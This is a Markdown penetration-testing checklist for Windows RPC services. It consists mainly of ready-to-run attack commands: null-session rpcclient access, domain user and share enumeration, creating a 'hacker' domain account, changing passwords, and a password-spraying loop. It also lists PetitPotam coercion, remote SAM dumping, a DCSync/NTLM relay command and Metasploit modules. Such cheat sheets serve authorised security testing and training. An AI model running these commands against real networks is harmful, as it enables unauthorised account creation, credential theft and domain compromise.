# RPC Pentesting Checklist & Commands

## üéØ What am I realistically expecting to find here?

‚≠ê After enumerating RPC (typically port 135 or 111), I realistically expect to find:

- [ ] Null sessions that allow anonymous access  
- [ ] Domain users, groups, and SID info  
- [ ] Misconfigurations allowing domain user creation or deletion  
- [ ] Privileged account info or share listings  
- [ ] Ability to coerce authentication (PetitPotam, etc.)  
- [ ] SAM or LSA secrets (if credentials are valid)  
- [ ] Possible lateral movement or escalation via RPC abuse  

---

## ‚úÖ RPC Pentest Checklist

- [ ] **Basic RPC Enumeration**
  - Identify RPC services, ports, and bindings.
    ```
    nmap -sV -sC -p135 <IP>
    rpcinfo -p <IP>
    rpcbind -p <IP>
    ```

- [ ] **RPCClient Null Session**
  - Check for access without authentication.
    ```
    rpcclient -U '' -N <IP>
    ```

- [ ] **RPCClient With Credentials**
  - Run useful enumeration commands.
    ```
    rpcclient -U 'user%pass' <IP>
    ```

  - Common interactive commands:
    ```
    querydominfo
    enumdomusers
    enumdomgroups
    enumprivs
    enumdomains
    getdompwinfo
    lsaenumsid
    lsaquery
    dsroledominfo
    ```

- [ ] **User-Specific Enumeration**
  - Focus on a single user or SID.
    ```
    queryuser <username>
    lookupnames <username>
    lsaenumprivsaccount <SID>
    ```

- [ ] **Group & Share Enumeration**
  - Investigate access rights and shares.
    ```
    enumalsgroups builtin
    netshareenum
    netshareenumall
    netsharegetinfo Confidential
    ```

- [ ] **Create & Manage Domain Users (if permitted)**
    ```
    createdomuser hacker
    setuserinfo2 hacker 24 Password@1
    deletedomuser hacker
    ```

- [ ] **Manage Groups (if permitted)**
    ```
    createdomgroup newgroup
    deletedomgroup newgroup
    ```

- [ ] **Change User Password (if permitted)**
    ```
    chgpasswd user1 OldPass123 NewPass456
    ```

- [ ] **Check Accounts Using Scripted Loop**
  - Validate multiple accounts against RPC:
    ```
    for u in $(cat valid_users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" <IP> | grep Authority; done
    ```

---

## ‚úÖ Python-Based RPC Tools

- **Coerce Authentication (PetitPotam)**
    ```
    python3 PetitPotam.py -d test.local -u john -p password123 <TargetDC> <Listener>
    ```

- **List Remote Services**
    ```
    python3 services.py test.local/john:password123@<IP> list
    ```

- **Dump SAM Remotely**
    ```
    python3 samrdump.py test.local/john:password123@<IP>
    ```

- **Full RPC Dump**
    ```
    python3 rpcdump.py test.local/john:password123@<IP>
    ```

- **SID Lookup**
    ```
    python3 lookupsid.py test.local/john:password123@<IP>
    ```

- **DCSync with NTLM Relay Tool**
    ```
    python3 dementor.py -u john -p password123 -d test.local <DC> <RelayListener>
    ```

---

## ‚úÖ Metasploit Modules

- **RPC User Enumeration**
    ```
    use auxiliary/scanner/dcerpc/endpoint_mapper
    ```

- **NetShare Enum**
    ```
    use auxiliary/admin/smb/smb_enumshares
    ```
